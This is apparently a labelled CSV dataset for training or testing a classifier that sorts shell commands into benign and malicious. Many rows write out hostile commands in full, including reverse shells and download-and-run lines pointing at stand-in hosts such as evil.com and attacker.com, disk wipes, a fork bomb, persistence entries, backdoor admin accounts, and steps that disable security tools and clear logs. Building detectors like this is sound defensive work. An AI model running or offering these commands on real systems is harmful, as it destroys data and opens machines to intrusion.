command,label
last,benign
who > output.txt,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
sudo groups user,benign
ncat -lvp 443 -e cmd.exe,malicious
nohup sdelete -p 10 -s -z C:\,malicious
touch newfile.txt,benign
python --version,benign
nohup sdelete -p 10 -s -z C:\,malicious
cat /dev/urandom > /dev/sda,malicious
(sc stop Windows Defender),malicious
last,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
wevtutil cl Security,malicious
csc -target:library file.cs,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon >/dev/null,malicious
service apache2 status,benign
type ls,benign
nohup curl http://evil.com/payload.sh | bash,malicious
npm list,benign
attrib +h +s malware.exe,malicious
git clone https://github.com/user/repo.git,benign
nslookup google.com,benign
usermod -aG sudo user,benign
top,benign
(nc -l -p 4444 -e /bin/bash),malicious
free -m -v,benign
passwd user | head -5,benign
mkfs.ext4 /dev/sda1 >/dev/null,malicious
finger user,benign
net localgroup administrators hacker /add,malicious
echo 'Hello World',benign
uptime,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash &",malicious
cipher /w:C:\,malicious
curl http://evil.com/payload.sh | bash,malicious
service apache2 status,benign
ls -la,benign
find /home -name '*.txt' --help,benign
netsh advfirewall set allprofiles state off,malicious
(sdelete -p 10 -s -z C:\),malicious
ncat -lvp 443 -e cmd.exe,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
sed 's/old/new/g' file.txt > output.txt,benign
taskkill /f /im antimalware.exe,malicious
mkfs.ext4 /dev/sda1 &,malicious
"timeout 60 ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
curl http://evil.com/payload.sh | bash,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
wevtutil cl Security,malicious
cipher /w:C:\,malicious
sudo yum list installed,benign
(chmod 777 /etc/shadow),malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
traceroute google.com,benign
free -m,benign
cat /dev/urandom > /dev/sda,malicious
taskkill /f /im antimalware.exe,malicious
vmstat,benign
timeout 60 format C: /q /x,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
service apache2 status,benign
java -version,benign
type ls 2>/dev/null,benign
:(){ :|:& };:,malicious
cat /etc/passwd,benign
wget http://malicious.com/malware.exe 2>&1,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
wmic process call create 'cmd.exe /c powershell.exe' 2>&1,malicious
"nohup python -c 'import os; os.system(""rm -rf /"")'",malicious
echo 'Hello World' > output.txt,benign
du -sh /var/log,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
cipher /w:C:\,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll &,malicious
mshta javascript:alert('code execution'),malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
java -version -v,benign
apt list --installed,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
w,benign
attrib +h +s malware.exe 2>&1,malicious
cp file1.txt file2.txt 2>/dev/null,benign
finger user,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
df -h,benign
htop,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
cat /dev/urandom > /dev/sda,malicious
nslookup google.com,benign
chown user:group file.txt | head -5,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
format C: /q /x,malicious
sc stop Windows Defender &,malicious
wevtutil cl Security,malicious
timeout 60 bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
cmd /c del /q /s C:\*,malicious
sc stop Windows Defender 2>&1,malicious
rsync -av /src/ /dst/,benign
sdelete -p 10 -s -z C:\,malicious
shutdown /r /f /t 0,malicious
ncat -lvp 443 -e cmd.exe,malicious
wevtutil cl System,malicious
taskkill /f /im antimalware.exe,malicious
mkfs.ext4 /dev/sda1,malicious
free -m,benign
cipher /w:C:\ 2>&1,malicious
nslookup google.com,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll 2>&1,malicious
ncat -lvp 443 -e cmd.exe,malicious
rm -rf /,malicious
curl -I https://google.com,benign
wc -l document.txt,benign
chmod 777 /etc/shadow,malicious
ufw status,benign
dd if=/dev/zero of=/dev/sda,malicious
:(){ :|:& };:,malicious
mkdir -p /tmp/test,benign
dd if=/dev/zero of=/dev/sda,malicious
sdelete -p 10 -s -z C:\,malicious
usermod -aG sudo user,benign
node --version,benign
csc -target:library file.cs,benign
tar -czf backup.tar.gz /data --help,benign
mkfs.ext4 /dev/sda1,malicious
timeout 60 powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
vssadmin delete shadows /all /quiet,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
mkfs.ext4 /dev/sda1,malicious
cat /dev/urandom > /dev/sda 2>&1,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
taskkill /f /im antimalware.exe 2>&1,malicious
pwd,benign
docker images,benign
:(){ :|:& };: >/dev/null,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
cipher /w:C:\,malicious
nc -l -p 4444 -e /bin/bash,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' 2>&1",malicious
nc -l -p 4444 -e /bin/bash,malicious
pip list,benign
mv old.txt new.txt,benign
msbuild project.csproj -v,benign
mount,benign
systemctl status nginx | head -5,benign
taskkill /f /im antimalware.exe 2>&1,malicious
certutil -hashfile file.txt SHA256,benign
sc stop Windows Defender,malicious
sudo lsblk,benign
curl http://evil.com/payload.sh | bash,malicious
curl http://evil.com/payload.sh | bash,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
"nohup perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
nc -l -p 4444 -e /bin/bash 2>&1,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
who --help,benign
history --help,benign
(net localgroup administrators hacker /add),malicious
ncat -lvp 443 -e cmd.exe,malicious
id user,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
cmd /c del /q /s C:\*,malicious
yum list installed 2>/dev/null,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= &,malicious
nc -l -p 4444 -e /bin/bash,malicious
awk '{print $1}' data.txt,benign
whoami,benign
systemctl reload nginx,benign
shutdown /r /f /t 0 >/dev/null,malicious
cmd /c del /q /s C:\*,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
nohup dd if=/dev/zero of=/dev/sda,malicious
kubectl get pods,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
attrib +h +s malware.exe 2>&1,malicious
chmod 777 /etc/shadow,malicious
java -version,benign
rm -rf /,malicious
ssh user@server.com,benign
top -v,benign
cat /etc/passwd,benign
service apache2 status,benign
top > output.txt,benign
diskpart select disk 0 clean,malicious
dd if=/dev/zero of=/dev/sda,malicious
tar -czf backup.tar.gz /data -v,benign
lsblk > output.txt,benign
umount /dev/sdb1,benign
rm -rf /,malicious
type ls -v,benign
python --version,benign
nohup mkfs.ext4 /dev/sda1,malicious
grep pattern file.txt,benign
sort data.txt,benign
format C: /q /x,malicious
sudo type ls,benign
traceroute google.com,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
pwd,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe 2>&1,malicious
ping -c 4 google.com -v,benign
netsh advfirewall set allprofiles state off,malicious
free -m,benign
sed 's/old/new/g' file.txt,benign
passwd user,benign
wevtutil cl System,malicious
netsh advfirewall set allprofiles state off,malicious
shutdown /r /f /t 0,malicious
usermod -aG sudo user --help,benign
net user hacker password123 /add,malicious
attrib +h +s malware.exe >/dev/null,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
useradd newuser,benign
systemctl reload nginx,benign
(schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon),malicious
wevtutil cl Security,malicious
nohup cipher /w:C:\,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts 2>&1,malicious
(bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe),malicious
nohup sdelete -p 10 -s -z C:\,malicious
tail -f /var/log/syslog,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
awk '{print $1}' data.txt,benign
apt list --installed,benign
ping -c 4 google.com,benign
grep pattern file.txt,benign
echo 'virus' > /etc/passwd,malicious
net user hacker password123 /add,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
ncat -lvp 443 -e cmd.exe,malicious
"cut -d',' -f1 data.csv",benign
kubectl get pods,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
diskpart select disk 0 clean,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
curl http://evil.com/payload.sh | bash,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
mkdir -p /tmp/test,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
attrib +h +s malware.exe,malicious
ncat -lvp 443 -e cmd.exe,malicious
userdel olduser,benign
traceroute google.com,benign
kubectl get pods,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
format C: /q /x &,malicious
net localgroup administrators hacker /add,malicious
nslookup google.com -v,benign
umount /dev/sdb1 2>/dev/null,benign
iostat --help,benign
net user hacker password123 /add,malicious
tar -czf backup.tar.gz /data,benign
attrib +h +s malware.exe,malicious
sudo top,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
wevtutil cl System,malicious
certutil -hashfile file.txt SHA256,benign
id user | head -5,benign
crontab -l,benign
grep pattern file.txt,benign
cipher /w:C:\,malicious
last,benign
ps aux,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
ssh user@server.com,benign
sdelete -p 10 -s -z C:\,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
free -m,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe >/dev/null,malicious
wget http://malicious.com/malware.exe,malicious
"nohup perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
git pull origin main,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
shutdown /r /f /t 0 2>&1,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
ss -tulpn,benign
cat /dev/urandom > /dev/sda,malicious
mkfs.ext4 /dev/sda1,malicious
net localgroup administrators hacker /add,malicious
pip list,benign
csc -target:library file.cs 2>/dev/null,benign
powershell Get-Process,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash >/dev/null",malicious
taskkill /f /im antimalware.exe,malicious
taskkill /f /im antimalware.exe,malicious
grep pattern file.txt,benign
diskpart select disk 0 clean,malicious
netsh advfirewall set allprofiles state off 2>&1,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
:(){ :|:& };:,malicious
certutil -hashfile file.txt SHA256,benign
ps aux,benign
usermod -aG sudo user,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash &",malicious
w -v,benign
nohup powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
mkfs.ext4 /dev/sda1,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe &,malicious
history,benign
yum list installed,benign
iostat > output.txt,benign
systemctl status nginx,benign
ncat -lvp 443 -e cmd.exe,malicious
fdisk -l,benign
traceroute google.com,benign
diskpart select disk 0 clean,malicious
echo 'Hello World',benign
curl http://evil.com/payload.sh | bash,malicious
format C: /q /x,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= >/dev/null,malicious
nc -l -p 4444 -e /bin/bash >/dev/null,malicious
nc -l -p 4444 -e /bin/bash,malicious
touch newfile.txt,benign
msbuild project.csproj,benign
groups user,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ >/dev/null,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
chmod 777 /etc/shadow,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
mkfs.ext4 /dev/sda1,malicious
mkdir -p /tmp/test,benign
echo 'Hello World',benign
attrib +h +s malware.exe,malicious
history,benign
certutil -hashfile file.txt SHA256,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll --help,benign
net user hacker password123 /add 2>&1,malicious
man ls > output.txt,benign
mount > output.txt,benign
echo 'virus' > /etc/passwd >/dev/null,malicious
echo 'Hello World',benign
echo 'virus' > /etc/passwd,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
shutdown /r /f /t 0,malicious
date,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
pwd,benign
sudo find /home -name '*.txt',benign
vssadmin delete shadows /all /quiet 2>&1,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') 2>&1",malicious
diskpart select disk 0 clean 2>&1,malicious
sdelete -p 10 -s -z C:\,malicious
npm list | head -5,benign
groups user > output.txt,benign
free -m -v,benign
ncat -lvp 443 -e cmd.exe,malicious
net localgroup administrators hacker /add,malicious
mkfs.ext4 /dev/sda1 &,malicious
(ncat -lvp 443 -e cmd.exe),malicious
finger user,benign
nohup sdelete -p 10 -s -z C:\,malicious
net localgroup administrators hacker /add,malicious
crontab -l,benign
systemctl reload nginx,benign
netstat -tulpn > output.txt,benign
iptables -L,benign
cat /dev/urandom > /dev/sda,malicious
npm list,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
crontab -l,benign
docker images | head -5,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
(schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon),malicious
sc stop Windows Defender,malicious
nc -l -p 4444 -e /bin/bash,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
attrib +h +s malware.exe,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
netsh advfirewall set allprofiles state off,malicious
"python -c 'import os; os.system(""rm -rf /"")' &",malicious
"timeout 60 perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
whoami,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
ssh user@server.com 2>/dev/null,benign
last,benign
wevtutil cl Security,malicious
sdelete -p 10 -s -z C:\,malicious
mshta javascript:alert('code execution'),malicious
last,benign
format C: /q /x,malicious
nohup sc stop Windows Defender,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' >/dev/null",malicious
nohup mshta javascript:alert('code execution'),malicious
echo 'Hello World' > output.txt,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
"cut -d',' -f1 data.csv",benign
msbuild project.csproj,benign
wevtutil cl System 2>&1,malicious
"(python -c 'import os; os.system(""rm -rf /"")')",malicious
touch newfile.txt,benign
cp file1.txt file2.txt,benign
:(){ :|:& };:,malicious
:(){ :|:& };:,malicious
format C: /q /x,malicious
passwd user,benign
format C: /q /x,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
sdelete -p 10 -s -z C:\,malicious
ss -tulpn --help,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
umount /dev/sdb1,benign
java -version,benign
usermod -aG sudo user,benign
ssh user@server.com,benign
python --version > output.txt,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
csc -target:library file.cs,benign
netstat -tulpn,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
docker images,benign
free -m > output.txt,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
apt list --installed,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
node --version,benign
useradd newuser,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
:(){ :|:& };:,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon >/dev/null,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
"timeout 60 ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
net localgroup administrators hacker /add 2>&1,malicious
ncat -lvp 443 -e cmd.exe,malicious
node --version,benign
groups user | head -5,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
netstat -tulpn,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
groups user,benign
cat /etc/passwd,benign
wevtutil cl Security,malicious
who,benign
tail -f /var/log/syslog -v,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
mkfs.ext4 /dev/sda1,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' &",malicious
cat /dev/urandom > /dev/sda,malicious
ss -tulpn,benign
chown user:group file.txt,benign
dd if=/dev/zero of=/dev/sda,malicious
rm -rf /,malicious
cipher /w:C:\,malicious
ls -la -v,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
free -m,benign
sort data.txt,benign
sc stop Windows Defender &,malicious
timeout 60 bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
docker ps 2>/dev/null,benign
apt list --installed,benign
mshta javascript:alert('code execution'),malicious
diskpart select disk 0 clean,malicious
sed 's/old/new/g' file.txt,benign
docker images,benign
service apache2 status -v,benign
mkfs.ext4 /dev/sda1,malicious
node --version > output.txt,benign
iostat,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
umount /dev/sdb1 --help,benign
echo 'virus' > /etc/passwd 2>&1,malicious
taskkill /f /im antimalware.exe,malicious
grep pattern file.txt,benign
sdelete -p 10 -s -z C:\,malicious
sudo pip list,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
crontab -l,benign
whoami,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
chown user:group file.txt,benign
wevtutil cl Security,malicious
apt list --installed,benign
grep pattern file.txt,benign
docker images,benign
nohup wmic process call create 'cmd.exe /c powershell.exe',malicious
systemctl reload nginx,benign
docker images,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
echo 'Hello World',benign
cmd /c del /q /s C:\*,malicious
ssh user@server.com,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
net user hacker password123 /add,malicious
powershell Get-Process,benign
cat /dev/urandom > /dev/sda,malicious
net user hacker password123 /add,malicious
which python,benign
sed 's/old/new/g' file.txt --help,benign
iptables -L,benign
whoami,benign
timeout 60 mkfs.ext4 /dev/sda1,malicious
usermod -aG sudo user,benign
uptime,benign
nohup cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
cat /dev/urandom > /dev/sda,malicious
sc stop Windows Defender,malicious
apt list --installed,benign
:(){ :|:& };:,malicious
rmdir empty_folder,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
systemctl status nginx,benign
msbuild project.csproj,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
ncat -lvp 443 -e cmd.exe,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures >/dev/null,malicious
vssadmin delete shadows /all /quiet,malicious
sudo htop,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
ping -c 4 google.com,benign
pip list,benign
curl -I https://google.com 2>/dev/null,benign
sort data.txt --help,benign
touch newfile.txt --help,benign
ncat -lvp 443 -e cmd.exe,malicious
(powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=),malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
wevtutil cl System,malicious
mshta javascript:alert('code execution'),malicious
vmstat,benign
mkfs.ext4 /dev/sda1,malicious
sudo id user,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
shutdown /r /f /t 0,malicious
(reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe),malicious
wc -l document.txt,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
npm list,benign
chmod 777 /etc/shadow,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
cat /etc/passwd,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
rmdir empty_folder,benign
htop,benign
msbuild project.csproj > output.txt,benign
du -sh /var/log -v,benign
cat /dev/urandom > /dev/sda 2>&1,malicious
nohup reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
cat /dev/urandom > /dev/sda,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= >/dev/null,malicious
who,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
ufw status | head -5,benign
touch newfile.txt,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
grep pattern file.txt,benign
taskkill /f /im antimalware.exe,malicious
id user -v,benign
:(){ :|:& };:,malicious
tar -czf backup.tar.gz /data,benign
pwd,benign
powershell Get-Process > output.txt,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
sc stop Windows Defender,malicious
format C: /q /x,malicious
certutil -hashfile file.txt SHA256,benign
ufw status,benign
fdisk -l,benign
java -version,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
df -h | head -5,benign
ss -tulpn,benign
ss -tulpn,benign
passwd user > output.txt,benign
"timeout 60 python -c 'import os; os.system(""rm -rf /"")'",malicious
lsblk > output.txt,benign
netstat -tulpn,benign
git clone https://github.com/user/repo.git,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
fdisk -l,benign
nohup schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
fdisk -l | head -5,benign
attrib +h +s malware.exe,malicious
nohup dd if=/dev/zero of=/dev/sda,malicious
cmd /c del /q /s C:\* &,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
sort data.txt,benign
sudo uptime,benign
netsh advfirewall set allprofiles state off,malicious
df -h,benign
systemctl reload nginx,benign
pip list,benign
